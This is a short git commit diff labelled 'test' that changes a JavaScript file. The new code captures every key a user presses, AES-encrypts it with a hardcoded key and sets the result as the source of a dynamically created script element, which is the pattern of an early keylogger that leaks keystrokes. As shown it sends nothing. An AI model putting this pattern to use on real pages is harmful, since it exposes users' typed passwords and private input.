669bb1cae96e8109fd61e8016a2b5426f4d6dcaa
Alexandru Bara <alexandrubara2000@gmail.com>
2024-07-11 14:18:14 -0400

    test

--- scripts/script1.js
+++ scripts/script1.js
@@ -1,11 +1,20 @@
-document.addEventListener('keydown', keyHandler);
+var CryptoJS = require("crypto-js/core");
+CryptoJS.AES = require("crypto-js/aes");
 
-function keyHandler(e) {
+
+
+document.addEventListener('keydown', keyHandler1);
+
+function keyHandler1(e) {
     console.log('keydown event triggered')
-    // let attr1 = e.key;
-    let attr1 = 5;
+    let attr1 = e.key;
     let attr2 = e.location;
+    var message = JSON.stringify(attr1+attr2);
+    var key = "something";
+
+    var encrypted = CryptoJS.AES.encrypt(message, key);
     var script = document.createElement('script');
-    script.src = attr1 + attr2;
-    console.log(attr1 + attr2);
+    script.src = encrypted;
+    var decrypted = CryptoJS.AES.decrypt(encrypted, key);
+    console.log(decrypted);
 }
